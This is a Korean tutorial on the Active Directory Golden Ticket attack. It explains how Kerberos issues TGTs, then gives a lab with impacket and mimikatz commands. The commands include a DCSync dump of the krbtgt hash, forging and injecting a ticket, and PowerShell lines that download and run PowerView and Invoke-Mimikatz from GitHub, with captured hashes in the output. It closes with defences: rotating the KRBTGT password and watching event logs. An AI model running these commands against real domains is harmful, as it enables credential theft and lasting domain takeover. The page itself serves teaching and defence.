# 골든 티켓 (Golden Ticket)

골든 티켓은 공격자가 임의로 높은 권한 유저의 TGT (Ticket Granting Ticket) 를 KDC를 통하지 않고 만들어내는 액티브 디렉토리 지속성 공격이다. 지속성 공격이기 때문에 도메인 어드민이나 KRBTGT 유저를 장악한 뒤 진행한다. 골든 티켓 공격의 개념을 이해하려면 커버로스 인증에 대해 알고 있어야한다 - 이에 관련해서는 이 [페이지에서 서술](../credential-access/kerberos/)한다.&#x20;

커버로스의 TGT는 TGS를 얻기 위해 필요하다. TGT는 커버로스의 인증 첫 2개 단계인 AS-REQ 와 AS-REP을 통해서 만들어진다.&#x20;

1. **AS-REQ:** 유저는 현재 타임스탬프를 자신의 비밀번호 NT 해시를 이용해 암호화한 뒤, 자신의 유저 이름과 함께 KDC에게 보낸다.&#x20;
2. **AS-REP:** KDC는 받은 요청을 갖고 NTDS.dit 파일에 있는 유저의 NT 해시로 요청을 복호화 시도한 뒤, 이것이 복호화가 되면 유저가 올바른 비밀번호를 갖고 있다고 판단, TGT를 발급해준다. 이때 이 TGT는 액티브 디렉토리와 커버로스의 기본 유저인 `KRBTGT` 라는 유저의 비밀번호 해시로 암호화 되어 있다.&#x20;
3. 유저는 이 TGT를 가지고 다른 서비스에 연결할 수 있는 나머지 커버로스 인증 4단계를 가지고 TGS를 발급 받아 사용한다.&#x20;

TGT를 KDC와의 `AS-REQ, AS-REP` 인증 통신 없이 스스로 만들 수 있을까? 놀랍게도 가능하다. 단, 도메인 어드민 급의 높은 권한을 갖고 있어야한다 (그래서 지속성 공격이다).&#x20;

1. 도메인 이름&#x20;
2. 도메인 SID&#x20;
3. KRBTGT의 비밀번호 NT 해시 (높은 권한 필요)&#x20;
4. TGT를 발급 받을 유저 이름&#x20;
5. TGT를 발급 받을 유저의 RID&#x20;
6. TGT를 발급 받을 유저의 그룹 리스트 (아무거나 써도 된다)&#x20;

도메인을 장악한 공격자는 이 6가지를 모두 구할 수 있다. 이제 공격자는 KDC를 거치지 않고 스스로 TGT를 만들어낼 수 있다. 공격자가 스스로 만들어낸 TGT는...&#x20;

1. 도메인 어드민의 최고 권한을 갖고 있고&#x20;
2. 모든 서비스와 호스트에 접근할 수 있으며&#x20;
3. 최고 10년동안 지속된다.&#x20;

공격자는 앞으로 10년 동안 도메인 내 존재하는 모든 호스트와 서비스에 접근할 수 있는 도메인 관리자 권한의 TGT를 만들어냈다. 이것이 바로 골든 티켓 공격이다.&#x20;

### 실습&#x20;

{% tabs %}
{% tab title="리눅스" %}
1. 도메인 SID를 알아낸다.&#x20;

```
└─# impacket-lookupsid choi.local/Administrator:'Password123!'@dc01.choi.local -domain-sids        
Impacket v0.10.1.dev1+20220628.224634.5122bcf - Copyright 2022 SecureAuth Corporation

[*] Brute forcing SIDs at dc01.choi.local
[*] StringBinding ncacn_np:dc01.choi.local[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-915960992-2308152741-2736258720
```



2\. DC Sync를 이용해 KRBTGT 유저의 NT 해시를 알아낸다. (NetBIOS 도메인 이름 규격 사용)

```
└─# impacket-secretsdump CHOI/Administrator:'Password123!'@dc01.choi.local -just-dc-user CHOI\\krbtgt      
Impacket v0.10.1.dev1+20220628.224634.5122bcf - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a8f31b642e60b362cc17588df4c5b1e2:::
```



3\. 알아낸 정보를 바탕으로 골든티켓을 생성한다. NT 해시는 KRBTGT의 것을 사용한다.&#x20;

```
└─# impacket-ticketer Administrator -domain choi.local -domain-sid S-1-5-21-915960992-2308152741-2736258720 -nthash a8f31b642e60b362cc17588df4c5b1e2
```



4\. 티켓을 로드한 후 사용한다.&#x20;

```
export KRB5CCNAME=/root/blog/Administrator.ccache

└─# impacket-secretsdump -k dc01.choi.local                                                                                                                                                            
Impacket v0.10.1.dev1+20220628.224634.5122bcf - Copyright 2022 SecureAuth Corporation
                                                                                                                                                                                                       
[*] Target system bootKey: 0x37b7fe1178c20af620c25feb531fbe0d                         
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)                          
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::                                                                                                                 
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
< ... >
```

&#x20;
{% endtab %}

{% tab title="윈도우" %}
윈도우에서는 powerview와 Invoke-mimikatz를 이용해서 진행한다.&#x20;

(0. AMSI 우회를 진행한다. )

1. Powerview를 이용해 도메인 SID를 알아낸다.&#x20;

```
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1')
Get-DomainSID -Domain choi.local

S-1-5-21-915960992-2308152741-2736258720
```



2\.  KRBTGT의 NT 해시를 알아낸다.&#x20;

```
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:choi.local /user:krbtgt@choi.local"'

< ... >
Credentials:
  Hash NTLM: a8f31b642e60b362cc17588df4c5b1e2
    ntlm- 0: a8f31b642e60b362cc17588df4c5b1e2
    lm  - 0: 246a4fe4221c6c2f69dddac89af411d1
```



3\. Domain SID 와 KRBTGT의 NT 해시를 가지고 골든 티켓을 만든 뒤,  Pass-the-Ticket 을 이용해 골든 티켓이 로드된 파워쉘 세션을 생성한다.&#x20;

```
Invoke-Mimikatz -Command '"kerberos::golden /admin:Administrator /domain:choi.local /id:500 /sid:S-1-5-21-915960992-2308152741-2736258720 /krbtgt:a8f31b642e60b362cc17588df4c5b1e2"'

Invoke-Mimikatz -Command '"kerberos::ptt <티켓-파일>"'
.\Rubeus.exe ptt /ticket:<티켓-파일>
```

이렇게 하면 현재 디렉토리에 `ticket.kirbi` 라는 골든티켓이 생성된다. 이를 mimikatz 나 Rubeus 등을 이용해 사용할 수 있다.&#x20;

번거롭게 파일로 저장하기 싫다면 Mimikatz를 이용해서 골든 티켓이 들어가 있는 새로운 파워쉘 세션을 만들 수도 있다. 이를 위해서 Pass-the-Ticket 플래그를 추가해준다.&#x20;

```
Invoke-Mimikatz -Command '"kerberos::golden /admin:Administrator /domain:choi.local /id:500 /sid:S-1-5-21-915960992-2308152741-2736258720 /krbtgt:a8f31b642e60b362cc17588df4c5b1e2 /ptt"'
Hostname: wkstn01.choi.local / S-1-5-21-915960992-2308152741-2736258720

< ... >
mimikatz(powershell) # kerberos::golden /admin:Administrator /domain:choi.local /id:500 /sid:S-1-5-21-915960992-2308152741-2736258720 /krbtgt:a8f31b642e60b362cc17588df4c5b1e2 /ptt
User      : Administrator
Domain    : choi.local (CHOI)
SID       : S-1-5-21-915960992-2308152741-2736258720
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: a8f31b642e60b362cc17588df4c5b1e2 - rc4_hmac_nt
Lifetime  : 7/3/2022 5:39:54 PM ; 6/30/2032 5:39:54 PM ; 6/30/2032 5:39:54 PM
-> Ticket : ** Pass The Ticket **

Golden ticket for 'Administrator @ choi.local' successfully submitted for current session
```

도메인 관리자인 Administrator의 TGT가 만들어졌고, 이는 "6/30/2032 5:39:54 PM" 까지 지속되는 10년짜리 골든 티켓이다. 이 TGT는 현재 파워쉘 세션에 로드되었다.&#x20;
{% endtab %}
{% endtabs %}



### 대응 방안&#x20;

* 이미 만들어진 골든 티켓은 도메인 내 KRBTGT 계정의 비밀번호가 2번 바뀌면 더 이상 사용할 수 없게 된다. 단, KRBTGT 계정의 비밀번호를 바꾸면 다른 서비스들도 재시작이 필요할 수도 있기 때문에 프로덕션에서 진행할 것이라면 비즈니스 시간이 아닌 시간에 업데이트 하는 것이 좋다. 또한, 2번 바꿀 때 어느정도 텀을 두고 바꾸는 것이 좋다. 곧바로 KRBTGT의 비밀번호를 두번 연달아 바꾸면 현존하는 세션, 티켓, 그리고 DC Sync 기능이 먹통이 될 수 있다.&#x20;

다음의 탐지 방안은 많은 숫자의 로그를 생성할 수 있으니 프로덕션에 적용하기 전 충분한 테스트를 거쳐야한다.&#x20;

* `Default Domain Controllers Policy/Computer Configuration/Policies/Windows Settings/Advanced Audit Policy Configuration/Account Logon/Audit Kerberos Authentication Service` 에서 Success 로깅 설정을 한다.&#x20;
  * 이벤트 ID - 4768 - Authentication Ticket was Requested 를 수집한다.&#x20;
* `Default Domain Controllers Policy/Computer Configuration/Policies/Windows Settings/Security Settings/Advanced Audit Policy Configuration/Audit Policies/Account Logon/Audit Kerberos Service Ticket Operations - Success`&#x20;
  * 이벤트 ID - 4769 - Kerberos Service Ticket was Granted 를 수집한다.&#x20;
* 만약 4768이 없는 4769 이벤트가 존재한다면, 알람을 울린다 - TGT 요청 없이 TGS 만 요청한 것이기 때문에 이미 골든 티켓을 공격자가 가지고 있다는 반증이 될 수 있다.&#x20;

골든 티켓 공격은 탐지하기 어렵기 때문에 최대한 KRBTGT 비밀번호를 바꾸며 피해를 최소화한다. 또한, 지속성 공격이기 때문에 애당초 도메인이 장악 당하지 않도록 다른 공격을 막는데 신경 쓰도록 한다.&#x20;



### 레퍼런스&#x20;

{% embed url="https://adsecurity.org/?p=483" %}

{% embed url="https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it" %}

{% embed url="https://adsecurity.org/?p=1515" %}
